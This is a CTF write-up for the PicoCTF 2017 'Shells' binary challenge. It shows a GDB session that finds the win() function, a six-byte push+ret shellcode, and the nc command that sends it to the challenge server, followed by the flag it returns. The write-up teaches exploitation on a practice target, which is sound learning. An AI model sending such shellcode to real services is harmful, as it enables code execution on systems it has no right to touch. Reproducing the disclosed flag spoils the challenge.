# PicoCTF_2017: Shells

**Category:** Binary
**Points:** 70
**Description:**

>How much can a couple bytes do? Use [shells](shells) [Source](shells.c). Connect on shell2017.picoctf.com:40976.

**Hint:**

>Read about basic shellcode
You don't need a full shell (yet...), just enough to get the flag

## Write-up
Before we can craft a shellcode, we need to know the address of our `win()` function and loading up GDB is our best shot at it.

    $ gdb shells
    GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
    Copyright (C) 2014 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from shells...(no debugging symbols found)...done.
    (gdb) info address win
    Symbol "win" is at 0x8048540 in a file compiled without debugging.

Simple, now we know `win()` is at `0x8048540`. Let's craft a really simple `push+ret` shellcode.

    0:  68 40 85 04 08          push   0x8048540
    5:  c3                      ret

Put together, this gives us `\x68\x40\x85\x04\x08\xC3`. Let's try it.

    $ python -c "print('\x68\x40\x85\x04\x08\xC3')" | nc shell2017.picoctf.com 40976
    My mother told me to never accept things from strangers
    How bad could running a couple bytes be though?
    Give me 10 bytes:
    cd875b6ffb5cdd3319532d52ceca71aa

Therefore, the flag is `cd875b6ffb5cdd3319532d52ceca71aa`